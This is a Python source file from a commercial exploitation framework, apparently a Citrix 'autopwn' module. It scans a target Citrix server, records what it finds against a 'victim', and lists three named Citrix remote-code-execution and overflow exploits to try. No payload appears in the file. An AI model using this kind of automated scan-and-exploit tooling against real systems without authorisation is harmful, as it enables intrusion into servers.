#! /usr/bin/env python

#
# Proprietary D2 Exploitation Pack source code - use only under the license 
# agreement specified in LICENSE.txt in your D2 Exploitation Pack
#
# Copyright DSquare Security, LLC, 2007-2011
#

import autopwn
import appli.citrix
import xmlrpclib

class run(autopwn.run):

  CANVAS_EXPLOITS = {
    'Citrix Provisioning Services': ['Citrix Provisioning Services streamprocess.exe Remote Code Execution Vulnerability', 'd2sec_citrixps'],
    'Citrix IMA': ['Citrix Metaframe Presentation Server 4.0 IMA Service Heap Overflow', 'd2sec_citrix_ima'],
    'Citrix XP Print Provider': ['Citrix MetaFrame XP Print Provider Stack Overflow', 'citrix_pp'],
  }

  def exploit(self, target, port):
    result = ''
    discovery = [
      appli.citrix.app_enum,
    ]
    self.log.info('Citrix server scan %s:%s' % (target, port))
    try:
      for fct in discovery:
        infos = fct(target)
        if infos:
          for info in infos:
            result += '%s' % info
    except xmlrpclib.Fault, fault:
      print fault.faultString
      return
    self.db.db_unique_info(self.victim, self.service, 'Citrix Server Scanner', 'autopwn_citrix', result)
    self.log.debug('%s' % result)
    self.list_exploits()
